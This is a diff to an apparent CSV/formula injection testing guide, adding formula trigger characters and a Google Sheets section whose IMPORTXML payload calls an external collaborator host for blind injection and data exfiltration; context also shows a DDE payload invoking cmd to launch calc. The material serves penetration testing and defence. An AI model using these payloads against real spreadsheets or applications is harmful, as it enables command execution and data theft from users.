@@ -1767,6 +1767,12 @@ CSV Injection, also known as Formula Injection, occurs when an application allow
 4. If the injected formula executes (e.g., launches the calculator), the application is vulnerable.
 
 > **Mistake:** Do not upload the Excel file back into the application for verification. This results in a false negative.
+```
+=
++
+–
+@
+```
 
 ## Example Payloads
 ### Pop Calculator
@@ -1795,6 +1801,22 @@ DDE ("cmd";"/C calc";"!A0")A0
 - `cmd` is the command-line interpreter that the formula can invoke.
 - `/C calc` specifies the command to execute (`calc.exe` in this case).
 - `!A0` or similar references indicate where the formula should be placed in the spreadsheet.
+
+### Google Sheets
+
+Google Sheets allows some additionnal formulas that are able to fetch remote URLs:
+
+* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
+* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
+* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
+* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
+* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)
+
+So one can test blind formula injection or a potential for data exfiltration with:
+
+```c
+=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
+```
 
 ## Mitigation
 To prevent CSV injection:
